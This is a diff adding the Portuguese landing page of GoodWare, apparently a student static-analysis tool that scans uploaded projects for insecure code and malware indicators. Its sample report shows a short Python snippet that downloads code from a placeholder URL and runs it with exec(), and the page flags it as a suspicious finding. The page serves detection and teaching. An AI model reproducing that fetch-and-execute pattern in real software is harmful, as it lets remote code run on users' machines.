@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0a0a0c" />
+  <meta name="description" content="GoodWare: análise estática de projetos para encontrar brechas e indicadores de malware, sem executar o código enviado." />
+  <title>GoodWare — Análise estática para quem desenvolve</title>
+  <link rel="stylesheet" href="css/fonts.css" />
+  <link rel="stylesheet" href="css/base.css" />
+  <link rel="stylesheet" href="css/landing.css" />
+</head>
+<body>
+  <a class="skip-link" href="#main">Pular para o conteúdo</a>
+  <div class="announcement">
+    <span class="announcement-dot"></span>
+    <span>Projeto acadêmico · Análise estática local · Sem executar o código</span>
+  </div>
+
+  <header class="site-header" id="top">
+    <a class="brand" href="#top" aria-label="GoodWare — início">
+      <span class="brand-mark" aria-hidden="true"><span></span><span></span><span></span><span></span></span>
+      <span>GoodWare</span>
+    </a>
+
+    <nav class="nav" id="primary-nav" aria-label="Navegação principal">
+      <a href="#product">Produto</a>
+      <a href="#security">Recursos</a>
+      <a href="#feedbacks">Feedbacks</a>
+      <!-- Visíveis só no menu mobile (o cabeçalho esconde as ações em telas pequenas) -->
+      <a class="nav-mobile-only" href="login.html">Minha conta</a>
+      <a class="nav-mobile-only" href="login.html">Abrir GoodWare</a>
+    </nav>
+
+    <div class="header-actions">
+      <a class="login" href="login.html">Minha conta</a>
+      <a class="button button-small" href="login.html">Abrir GoodWare</a>
+    </div>
+
+    <button class="menu-toggle" type="button" aria-label="Abrir menu" aria-expanded="false" aria-controls="primary-nav">
+      <span></span><span></span><span></span>
+    </button>
+  </header>
+
+  <main id="main" tabindex="-1">
+    <section class="hero section-grid" id="product">
+      <div class="hero-copy reveal">
+        <div class="eyebrow"><span class="eyebrow-dot"></span> Análise estática de código</div>
+        <h1>Entenda o código.<br /><em>Revise os riscos.</em></h1>
+        <p class="hero-lead">Inspecione projetos, encontre padrões inseguros e investigue evidências em um relatório claro. Tudo no seu computador, sem executar o código enviado.</p>
+        <div class="hero-actions">
+          <a class="button" href="login.html">Iniciar análise <span>→</span></a>
+          <a class="button button-ghost" href="painel.html">Abrir painel</a>
+        </div>
+      </div>
+
+      <div class="hero-visual reveal" aria-label="Exemplo ilustrativo de relatório, sem análise real">
+        <div class="preview-label"><strong>Por dentro do relatório</strong><span>Exemplo ilustrativo</span></div>
+        <div class="orb orb-b"></div>
+        <div class="console hero-console">
+          <div class="console-top">
+            <div class="traffic"><i></i><i></i><i></i></div>
+            <span>payment-service.zip / achados</span>
+            <span class="live">EXEMPLO</span>
+          </div>
+          <div class="console-body">
+            <div class="trace-sidebar">
+              <div class="trace-item active"><span class="sev sev-red"></span><strong>Código remoto</strong><small>Severidade alta</small></div>
+              <div class="trace-item"><span class="sev sev-amber"></span><strong>Segredo exposto</strong><small>Severidade alta</small></div>
+              <div class="trace-item"><span class="sev sev-purple"></span><strong>eval() dinâmico</strong><small>Revisão sugerida</small></div>
+              <div class="trace-item"><span class="sev sev-muted"></span><strong>Dependências</strong><small>Cobertura limitada</small></div>
+            </div>
+            <div class="trace-main">
+              <div class="trace-heading">
+                <div>
+                  <span class="issue-pill">INDICADOR SUSPEITO</span>
+                  <h3>Download e execução dinâmica de código remoto</h3>
+                </div>
+                
+              </div>
+              <div class="code-window">
+                <div class="code-row"><span>16</span><code>def sync():</code></div>
+                <div class="code-row"><span>17</span><code>    payload = requests.get(REMOTE_URL).content</code></div>
+                <div class="code-row error-row"><span>18</span><code>    exec(payload.decode())</code></div>
+                <div class="code-row"><span>19</span><code></code></div>
+                <div class="code-row"><span>20</span><code>os.system(f"chmod +x {LOCAL_PATH}")</code></div>
+              </div>
+              <div class="root-cause">
+                <span class="spark">✦</span>
+                <div>
+                  <strong>Evidência e confiança</strong>
+                  <p>O trecho baixa conteúdo remoto e o executa em seguida. Classificado por heurística (regra <code>EXEMPLO</code>, confiança média): indicador, não confirmação.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="security content-section" id="security">
+      <div class="security-card reveal">
+        <div>
+          <div class="eyebrow">SEGURANÇA E CONTROLE</div>
+          <h2>Da suspeita<br /><span>à evidência.</span></h2>
+        </div>
+        <div class="security-list">
+          <div><span>✓</span> Inspeção estática de arquivos ZIP</div>
+          <div><span>✓</span> Evidências, contexto e recomendações</div>
+          <div><span>✓</span> Inventário e limites de cobertura</div>
+          <div><span>✓</span> Assinaturas locais e padrões suspeitos</div>
+        </div>
+      </div>
+    </section>
+
+    <section class="quotes content-section" id="feedbacks">
+      <div class="quote-head reveal">
+        <div class="eyebrow">PERSPECTIVAS DE USO</div>
+        <h2>Uma interface pensada para quem desenvolve.</h2>
+      </div>
+      <p class="local-note">Depoimentos ilustrativos para apresentação acadêmica; não representam avaliações verificadas.</p>
+      <div class="quote-grid">
+        <figure class="quote-card reveal">
+          <div class="quote-mark">“</div>
+          <blockquote>Usar o GW como ferramenta auxiliadora foi uma das minhas melhores escolhas profissionais.</blockquote>
+          <figcaption><span class="avatar">ND</span><div><strong>Nova D.</strong><small>Depoimento ilustrativo</small></div></figcaption>
+        </figure>
+        <figure class="quote-card reveal">
+          <div class="quote-mark">“</div>
+          <blockquote>O GoodWare me ajudou muito analisando meus projetos e mostrando possíveis brechas e malwares.</blockquote>
+          <figcaption><span class="avatar">AH</span><div><strong>Andrew H.</strong><small>Depoimento ilustrativo</small></div></figcaption>
+        </figure>
+        <figure class="quote-card reveal">
+          <div class="quote-mark">“</div>
+          <blockquote>Conheci o site através de um amigo desenvolvedor. Desde então, não faço um projeto sem antes passar por aqui.</blockquote>
+          <figcaption><span class="avatar">ID</span><div><strong>Igor D.</strong><small>Depoimento ilustrativo</small></div></figcaption>
+        </figure>
+      </div>
+    </section>
+
+    <section class="final-cta content-section reveal" id="demo">
+      <div class="cta-glow"></div>
+      <h2>Seu próximo passo:<br /><span>revisar com contexto.</span></h2>
+      <p>Envie um ZIP, examine os achados e exporte o relatório. A análise auxilia a revisão humana e não garante a segurança do projeto.</p>
+      <div class="hero-actions">
+        <a class="button" href="login.html">Analisar um projeto <span>→</span></a>
+        <a class="button button-ghost" href="painel.html">Abrir painel</a>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-bottom">
+      <span>© 2026 GoodWare. Projeto acadêmico (TCC).</span>
+      <span>Ferramenta de apoio à análise: a ausência de achados não garante que um projeto seja seguro.</span>
+    </div>
+  </footer>
+
+  <script src="js/landing.js"></script>
+</body>
+</html>
